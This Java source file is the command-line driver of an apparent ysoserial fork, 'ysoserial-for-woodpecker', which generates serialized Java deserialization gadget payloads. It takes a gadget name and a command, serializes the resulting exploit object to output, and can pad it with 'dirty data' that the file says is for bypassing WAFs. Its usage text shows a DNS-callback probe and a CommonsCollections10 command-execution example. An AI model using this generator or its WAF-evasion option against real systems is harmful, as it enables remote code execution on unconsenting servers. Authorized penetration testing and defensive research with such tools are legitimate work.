package yso;

import yso.payloads.ObjectPayload;
import yso.payloads.annotation.Authors;
import yso.payloads.annotation.Dependencies;
import yso.payloads.util.DirtyDataWrapper;
import org.apache.commons.cli.*;

import java.io.PrintStream;
import java.util.*;

@SuppressWarnings("rawtypes")
public class GeneratePayload {
    public static YsoConfig ysoConfig = new YsoConfig();
    public static CommandLine cmdLine;
    private static final int INTERNAL_ERROR_CODE = 70;
    private static final int USAGE_CODE = 64;
    private static final String VERSION = "0.5.2";

    public static void main(final String[] args) {
        Options options = new Options();
        options.addOption("g", "gadget",true, "java deserialization gadget");
        options.addOption("a", "args",true, "gadget parameters");
        options.addOption("ddl", "dirt-data-length",true,"Add the length of dirty data, used to bypass WAF");
        options.addOption("l", "list",false, "List all gadgets");
        options.addOption("c","compress",false,"Zip the Templates gadgets");
        CommandLineParser parser = new DefaultParser();

        try {
            cmdLine = parser.parse(options, args);
        }catch (Exception e){
            System.out.println("[*] Parameter input error, please use -h for more information");
            printUsage(options);
        }

        if(args.length == 0){
            printUsage(options);
            System.exit(USAGE_CODE);
        }

        if(cmdLine.hasOption("list")){
            listAllGadgets();
            return;
        }

        if(cmdLine.hasOption("compress")){
            ysoConfig.setCompress(true);
        }else{
            ysoConfig.setCompress(false);
        }

        final String payloadType = cmdLine.getOptionValue("gadget");
        final String command = cmdLine.getOptionValue("args");

        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            listAllGadgets();
            System.exit(USAGE_CODE);
            return; // make null analysis happy
        }

        try {
            ObjectPayload payload = payloadClass.newInstance();
            Object object = payload.getObject(command);

            if(cmdLine.hasOption("dirt-data-length")){
                int dirtDataLength = Integer.valueOf(cmdLine.getOptionValue("dirt-data-length"));
                DirtyDataWrapper dirtyDataWrapper = new DirtyDataWrapper(object,dirtDataLength);
                object = dirtyDataWrapper.doWrap();
            }

            PrintStream out = System.out;
            Serializer.serialize(object, out);
            ObjectPayload.Utils.releasePayload(payload, object);
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(INTERNAL_ERROR_CODE);
        }
        System.exit(0);
    }

    public static void printUsage(Options options){
        System.out.println(String.format("ysoserial-for-woodpecker v%s   \n",VERSION));

        new HelpFormatter().printHelp("ysoserial-for-woodpecker-<version>.jar", options, true);
        System.out.println("\n");
        System.out.println("Example:");
        System.out.println("1. DNSLOG\n java -jar ysoserial-for-woodpecker-<version>.jar -g URLDNS -a http://test.dnslog.com/");
        System.out.println("2. CC10\n  java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsCollections10 -a raw_cmd:calc\n\n");
        listAllGadgets();
        System.exit(0);
    }

    private static void listAllGadgets() {

        System.err.println("  Available payload types:");

        final List<Class<? extends ObjectPayload>> payloadClasses =
                new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
        Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[] {"Payload", "Authors", "Dependencies"});
        rows.add(new String[] {"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
            rows.add(new String[] {
                    payloadClass.getSimpleName(),
                    Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                    Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }
}
